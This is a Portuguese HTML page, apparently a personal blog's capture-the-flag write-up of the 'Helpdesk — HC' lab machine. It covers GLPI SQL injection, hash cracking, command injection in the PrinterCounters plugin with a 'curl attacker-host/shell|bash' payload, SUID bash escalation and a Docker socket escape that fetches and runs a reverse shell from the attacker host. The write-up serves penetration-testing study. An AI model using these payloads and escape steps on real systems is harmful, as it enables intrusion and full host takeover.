@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Helpdesk - HC // fstringuetta</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black: #000408; --panel: #010d1a; --cyan: #00d4ff; --cyan2: #00aacc;
+      --cyan-dim: #004455; --orange: #ff6600; --white: #e0f7ff; --muted: #3a7a8a;
+      --green: #44ff88; --purple: #cc88ff; --red: #ff4466;
+      --ff-title: 'Orbitron', monospace; --ff-mono: 'Share Tech Mono', monospace;
+      --glow-sm: 0 0 8px #00d4ff88; --glow-md: 0 0 16px #00d4ffaa, 0 0 32px #00d4ff44;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
+    .grid-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px); background-size: 48px 48px; opacity: 0.15; mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%); }
+    .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
+    .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
+    nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
+    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
+    .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
+    .nav-logo .slash { color: var(--orange); }
+    .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '←'; font-size: 14px; }
+    .toc-wrap { position: sticky; top: 52px; z-index: 90; background: rgba(0,4,8,0.97); backdrop-filter: blur(12px); border-bottom: 1px solid var(--cyan-dim); border-top: 1px solid var(--cyan-dim); }
+    .toc { max-width: 900px; margin: 0 auto; padding: 10px 32px; display: flex; align-items: center; gap: 20px; }
+    .toc-title { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); white-space: nowrap; }
+    .toc ol { list-style: none; counter-reset: toc; display: flex; flex-wrap: wrap; }
+    .toc li { counter-increment: toc; }
+    .toc a { color: var(--muted); text-decoration: none; font-size: 11px; display: flex; align-items: center; gap: 5px; padding: 4px 14px 4px 0; transition: color .2s; white-space: nowrap; }
+    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 9px; color: var(--cyan-dim); transition: color .2s; }
+    .toc a:hover { color: var(--cyan2); }
+    .toc a.active { color: var(--cyan); }
+    .toc a.active::before { color: var(--cyan); }
+    .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
+    .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
+    .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+    .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
+    .cat-web { border-color: #00d4ff55; color: var(--cyan2); }
+    .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
+    .wu-diff { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.12em; padding: 4px 12px; border: 1px solid; }
+    .diff-medium { border-color: #ffaa0055; color: #ffaa00; }
+    .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
+    .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
+    .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
+    .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
+    .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
+    .wi-value { font-family: var(--ff-title); font-size: 13px; font-weight: 700; color: var(--cyan); letter-spacing: 0.06em; }
+    .attack-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 32px 0 48px; }
+    .ac-step { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 14px; font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.06em; color: var(--cyan2); text-align: center; flex: 1; min-width: 80px; line-height: 1.5; }
+    .ac-step.highlight { border-color: var(--orange); color: var(--orange); }
+    .ac-step.pivot { border-color: var(--purple); color: var(--purple); }
+    .ac-arrow { color: var(--cyan-dim); font-size: 16px; padding: 0 2px; flex-shrink: 0; }
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
+    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
+    .callout-tip p { color: #44aa66; margin: 0; }
+    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
+    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
+    .callout-info p { color: #3a7a8a; margin: 0; }
+    .callout-info code { color: var(--cyan2); }
+    .callout-warn { background: rgba(255,102,0,0.05); border: 1px solid rgba(255,102,0,0.25); border-left: 3px solid var(--orange); padding: 16px 20px; margin: 20px 0; }
+    .callout-warn .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--orange); margin-bottom: 8px; }
+    .callout-warn p { color: #aa6633; margin: 0; }
+    footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
+    .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo">FSTR<span class="slash">/</span>NGUETTA</a>
+    <a href="../index.html" class="nav-back">Voltar</a>
+  </div>
+</nav>
+
+<div class="toc-wrap">
+  <nav class="toc">
+    <div class="toc-title">// Índice</div>
+    <ol>
+      <li><a href="#recon">Information Gathering</a></li>
+      <li><a href="#enum80">Enumeração — Porta 80</a></li>
+      <li><a href="#enum8080">Enumeração — Porta 8080</a></li>
+      <li><a href="#sqli">SQLi → Hash Dump</a></li>
+      <li><a href="#rce">RCE via Plugin GLPI</a></li>
+      <li><a href="#revshell">Reverse Shell</a></li>
+      <li><a href="#privesc">PrivEsc — SUID Bash</a></li>
+      <li><a href="#escape">Docker Escape via Socket</a></li>
+    </ol>
+  </nav>
+</div>
+
+<div class="page">
+
+  <header class="wu-header">
+    <div class="wu-meta">
+      <span class="wu-cat cat-web">Web App</span>
+      <span class="wu-date">ABR 2025</span>
+      <span class="wu-diff diff-medium">MEDIUM</span>
+    </div>
+    <h1 class="wu-title">Helpdesk — HC</h1>
+    <p class="wu-desc">
+      GLPI 10.0.17 vulnerável a SQLi via Metasploit expõe hashes de usuários. Após quebra do hash com John,
+      acesso autenticado permite RCE via plugin PrinterCounters (SQL Injection → Command Injection).
+      Escalada via SUID bash no container e Docker escape explorando socket exposto para comprometer o host.
+    </p>
+    <div class="wu-tags">
+      <span class="tag">GLPI</span>
+      <span class="tag">SQLi</span>
+      <span class="tag">Metasploit</span>
+      <span class="tag">Hash Cracking</span>
+      <span class="tag">RCE</span>
+      <span class="tag">SUID</span>
+      <span class="tag">Docker Escape</span>
+      <span class="tag">Docker Socket</span>
+    </div>
+    <div class="wu-infobar">
+      <div class="wu-infobar-item">
+        <span class="wi-label">Plataforma</span>
+        <span class="wi-value">HackClub</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">OS</span>
+        <span class="wi-value">Linux</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Dificuldade</span>
+        <span class="wi-value" style="color:#ffaa00">Medium</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">IP Alvo</span>
+        <span class="wi-value">172.16.1.244</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Data</span>
+        <span class="wi-value">18 ABR 2025</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ATTACK CHAIN -->
+  <div class="attack-chain">
+    <div class="ac-step">GLPI SQLi<br>Metasploit</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Hash Crack<br>John</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Plugin RCE<br>PrinterCounters</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step pivot">SUID Bash<br>root (container)</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Docker Socket<br>/var/run/docker.sock</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step highlight">root (host)</div>
+  </div>
+
+  <div class="wu-content">
+
+    <h2 id="recon">Information Gathering</h2>
+
+    <h3>Portscan — Fase 1 (All Ports)</h3>
+    <pre><span class="lang-label">bash</span><code>$ sudo nmap --open -Pn -p- --min-rate 200 --max-rate 500 -sS 172.16.1.244 -oA ALL-TCP-HELPDESK
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy</code></pre>
+
+    <h3>Portscan — Fase 2 (Service Detection)</h3>
+    <pre><span class="lang-label">bash</span><code>$ sudo nmap --open -Pn -p22,80,8080 -sVC 172.16.1.244 -oA Services-TCP-HELPDESK
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8
+80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: Help Desk - Technical Support Solution
+8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Authentication - GLPI</code></pre>
+
+    <p>Duas aplicações web distintas: porta 80 com um <strong>Help Desk</strong> estático e porta 8080 com o <strong>GLPI</strong> — sistema de gerenciamento de TI.</p>
+
+    <pre><span class="lang-label">bash</span><code>$ echo '172.16.1.244 helpdesk.hc' | sudo tee -a /etc/hosts</code></pre>
+
+    <h2 id="enum80">Enumeração Web — Porta 80</h2>
+
+    <p>Ao acessar a porta 80, identificamos uma página estática de Help Desk sem funcionalidades dinâmicas aparentes.</p>
+
+    <figure><img src="imgs/help.png" alt="Página estática Help Desk na porta 80" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/wordlists/diretorios-web-wordlist.txt \
+  -u http://helpdesk.hc/FUZZ -c -r
+
+.htaccess    [Status: 403]
+index.html   [Status: 200]
+server-status [Status: 403]</code></pre>
+
+    <p>Nenhum arquivo ou diretório acessível foi identificado para exploração. Seguimos para a porta 8080.</p>
+
+    <h2 id="enum8080">Enumeração Web — Porta 8080 (GLPI)</h2>
+
+    <p>Na porta 8080 encontramos o GLPI — aplicação de gerenciamento de helpdesk e inventário de TI. Credenciais padrão não funcionaram.</p>
+
+    <figure><img src="imgs/image.png" alt="Tela de login do GLPI na porta 8080" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ ffuf -w /usr/share/wordlists/diretorios-web-wordlist.txt \
+  -u http://helpdesk.hc:8080/FUZZ -c -r
+
+LICENSE     [Status: 200]
+ajax        [Status: 200]
+front       [Status: 200]
+index.php   [Status: 200]
+install     [Status: 200]
+lib         [Status: 200]
+marketplace [Status: 403]
+plugins     [Status: 403]
+public      [Status: 200]</code></pre>
+
+    <figure><img src="imgs/image 1.png" alt="Resultado do ffuf na porta 8080 com estrutura do GLPI" /></figure>
+
+    <p>A estrutura de diretórios confirma ser um GLPI. Identificamos a versão da aplicação para busca de vulnerabilidades conhecidas.</p>
+
+    <figure><img src="imgs/2025-04-18_11-17.png" alt="Versão GLPI 10.0.17 identificada" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ GLPI 10.0.17 — Vulnerabilidade Conhecida</div>
+      <p>Pesquisa com a dork <code>glpi 10.0.17 exploit</code> retorna um artigo detalhado sobre SQLi to RCE: <a href="https://blog.lexfo.fr/glpi-sql-to-rce.html" target="_blank">blog.lexfo.fr/glpi-sql-to-rce.html</a></p>
+    </div>
+
+    <h2 id="sqli">SQLi → Hash Dump via Metasploit</h2>
+
+    <p>Após testes manuais com base no artigo de referência não produzirem os resultados esperados, identificamos um módulo específico no Metasploit Framework para a vulnerabilidade. Configuramos os parâmetros e executamos:</p>
+
+    <figure><img src="imgs/image 2.png" alt="Módulo Metasploit configurado para GLPI SQLi" /></figure>
+    <figure><img src="imgs/image 3.png" alt="Execução do exploit confirmando vulnerabilidade" /></figure>
+
+    <p>Execução bem-sucedida — hashes de todos os usuários extraídos da tabela <code>glpi_users</code>:</p>
+
+    <pre><span class="lang-label">output — metasploit</span><code>glpi_users
+==========
+
+user                   password
+----                   --------
+glpi                   $2y$10$fucVSHUcQTnd4JgCos6wn.XWijq64Em2vALli0NIRqGax9FPiPh0q
+normal                 $2y$10$DzpsWVk6/E58rQMov8ZbXOMJ1jLFQw10G7soOI0EF0OVtPd6cpV6m
+post-only              $2y$10$rh.xhQiCT8Rjq6HPFKfeiOIXW2zoOmPYa.3OYUyjlsFPvbqEioCG.
+tech                   $2y$10$6XAeLVTMDwCmcO6mtJWZsuG0JYKX.lzZyeny8vSONSjDxH0R2ot8O</code></pre>
+
+    <figure><img src="imgs/image 4.png" alt="Hashes extraídos da tabela glpi_users" /></figure>
+
+    <p>Apenas o usuário <code>glpi</code> estava ativo. Quebramos o hash bcrypt com John the Ripper:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ john -w=/usr/share/wordlists/rockyou.txt hash-glpi1 --format=bcrypt
+
+qwertyuiop       (?)
+1g 0:00:00:09 DONE (2025-04-18 12:56)</code></pre>
+
+    <figure><img src="imgs/image 5.png" alt="John quebrando o hash bcrypt do usuário glpi" /></figure>
+
+    <div class="callout-tip">
+      <div class="cf-title">✓ Credenciais Obtidas</div>
+      <p><code>glpi</code> : <code>qwertyuiop</code></p>
+    </div>
+
+    <p>Validamos as credenciais autenticando na aplicação GLPI:</p>
+
+    <figure><img src="imgs/image 6.png" alt="Login bem-sucedido no GLPI com credenciais obtidas" /></figure>
+
+    <h2 id="rce">RCE via Plugin PrinterCounters</h2>
+
+    <p>Com acesso autenticado ao GLPI, seguimos o método descrito no artigo de referência. O plugin <strong>PrinterCounters</strong> possui um endpoint vulnerável a injeção de comandos via parâmetro <code>items_id</code>.</p>
+
+    <h3>Prova de Conceito — ICMP</h3>
+    <p>Capturamos a requisição da tela do plugin e injetamos um comando <code>curl</code> para validar a comunicação com nosso host:</p>
+
+    <pre><span class="lang-label">http request</span><code>POST /plugins/printercounters/ajax/process.php HTTP/1.1
+Host: helpdesk.hc:8080
+X-Glpi-Csrf-Token: c95e95fc9d6159f5518f6...
+Content-Type: application/x-www-form-urlencoded
+
+action=killProcess&items_id=1231231';curl+10.0.15.12/aaaa;#</code></pre>
+
+    <figure><img src="imgs/image 7.png" alt="Requisição com payload de RCE enviada via Burp" /></figure>
+    <figure><img src="imgs/image 8.png" alt="Request recebida no host atacante — RCE confirmado" /></figure>
+
+    <div class="callout-tip">
+      <div class="cf-title">✓ RCE Confirmado</div>
+      <p>Recebemos a requisição no nosso host — comunicação estabelecida. Pronto para enviar reverse shell.</p>
+    </div>
+
+    <h2 id="revshell">Reverse Shell</h2>
+
+    <p>Criamos o payload de reverse shell via <a href="https://reverse-shell.sh" target="_blank">reverse-shell.sh</a>, servimos via Python HTTP server e injetamos o comando de download e execução:</p>
+
+    <pre><span class="lang-label">http request</span><code>action=killProcess&items_id=1231231';curl+10.0.15.12/shell|bash;#</code></pre>
+
+    <figure><img src="imgs/image 9.png" alt="Payload de reverse shell enviado via Burp" /></figure>
+    <figure><img src="imgs/image 10.png" alt="Reverse shell recebida via Penelope" /></figure>
+
+    <p>Shell recebida! Referência: <a href="https://github.com/brightio/penelope" target="_blank">Penelope</a></p>
+
+    <p>Com acesso ao host, localizamos a primeira evidência na raiz <code>/</code> do sistema e confirmamos que estamos dentro de um <strong>container Docker</strong>.</p>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 1 — User Flag</div>
+      <p>Obtida na raiz <code>/</code> do container após acesso via RCE</p>
+    </div>
+
+    <h2 id="privesc">Escalada de Privilégios — SUID Bash</h2>
+
+    <p>Para dar continuidade ao Docker escape, primeiro precisamos de acesso root dentro do container. Transferimos o <strong>CDK</strong> para enumeração:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ wget http://10.0.15.12/cdk_linux
+$ chmod +x cdk_linux
+$ ./cdk_linux evaluate --full</code></pre>
+
+    <p>Referência: <a href="https://github.com/cdk-team/CDK" target="_blank">github.com/cdk-team/CDK</a></p>
+
+    <p>O CDK identificou o binário <code>/usr/bin/bash</code> com permissões <strong>SUID</strong>. Executamos com o parâmetro <code>-p</code> para preservar os privilégios elevados:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ /usr/bin/bash -p
+bash-5.2# whoami
+root</code></pre>
+
+    <figure><img src="imgs/image 11.png" alt="root obtido no container via SUID bash" /></figure>
+
+    <h2 id="escape">Docker Escape — Socket Exposto</h2>
+
+    <p>Com root no container, executamos o CDK novamente para identificar vetores de escape. O resultado revelou que o <strong>Docker socket</strong> estava montado dentro do container em <code>/var/run/docker.sock</code>.</p>
+
+    <div class="callout-warn">
+      <div class="cf-title">⚠ Docker Socket Exposto</div>
+      <p>O acesso ao socket <code>/var/run/docker.sock</code> permite comunicação direta com o Docker daemon do host — possibilitando criar containers privilegiados, montar o filesystem do host e executar comandos fora do isolamento.</p>
+    </div>
+
+    <p>Referência: <a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket" target="_blank">0xn3va — Exposed Docker Socket</a></p>
+
+    <h3>Passo 1 — Listar containers existentes</h3>
+    <pre><span class="lang-label">bash</span><code># curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq
+
+[
+  {
+    "Id": "fe36747c56c2...",
+    "Names": ["/glpi"],
+    "Image": "glpi_glpi",
+    "Mounts": [
+      {"Source": "/opt/glpi/flag.txt", "Destination": "/flag.txt"},
+      {"Source": "/var/run/docker.sock", "Destination": "/var/run/docker.sock"}
+    ]
+  }
+]</code></pre>
+
+    <h3>Passo 2 — Criar container privilegiado com host montado em /mnt</h3>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -X POST http://localhost/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "glpi_glpi",
+    "Tty": true,
+    "OpenStdin": true,
+    "HostConfig": {
+      "Privileged": true,
+      "Binds": ["/:/mnt"]
+    }
+  }'
+
+{"Id":"8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0"}</code></pre>
+
+    <h3>Passo 3 — Iniciar o container</h3>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -X POST \
+  http://localhost/containers/8be5a97c4db9.../start</code></pre>
+
+    <h3>Passo 4 — Download do payload no novo container</h3>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST \
+  http://localhost/containers/8be5a97c4db9.../exec \
+  -H "Content-Type: application/json" \
+  -d '{
+    "AttachStdout": true, "AttachStderr": true, "Tty": false,
+    "Cmd": ["curl", "-o", "/tmp/shell-root", "http://10.0.15.12/shell-root"]
+  }'
+{"Id":"b3694fd27042..."}</code></pre>
+
+    <h3>Passo 5 — Dar permissão e executar a reverse shell</h3>
+    <pre><span class="lang-label">bash</span><code># chmod +x via exec
+curl --unix-socket /run/docker.sock -s -X POST \
+  http://localhost/exec/b3694fd27042.../start \
+  -d '{"Detach": false, "Tty": false}'
+
+# Criar exec para execução do shell
+curl --unix-socket /run/docker.sock -s -X POST \
+  http://localhost/containers/8be5a97c4db9.../exec \
+  -d '{"Cmd": ["bash", "/tmp/shell-root"], ...}'
+
+# Executar
+curl --unix-socket /run/docker.sock -s -X POST \
+  http://localhost/exec/a7a419283dea.../start \
+  -d '{"Detach": false, "Tty": false}'</code></pre>
+
+    <p>Shell recebida como <strong>root</strong> no novo container privilegiado — com o filesystem completo do host montado em <code>/mnt</code>. Navegamos até <code>/mnt/root</code> e obtemos a última evidência.</p>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 2 — Root Flag (Host)</div>
+      <p>Obtida em <code>/mnt/root/</code> após Docker escape via socket e execução de shell no container privilegiado</p>
+    </div>
+
+  </div>
+
+  <footer>
+    <div><span class="status-dot"></span>fstringuetta.github.io</div>
+    <span>© 2025 · fstringuetta</span>
+  </footer>
+
+</div>
+
+<script>
+  const sections = document.querySelectorAll('.wu-content h2[id]');
+  const tocLinks = document.querySelectorAll('.toc a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.toc a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -80% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
+</script>
+</body>
+</html>
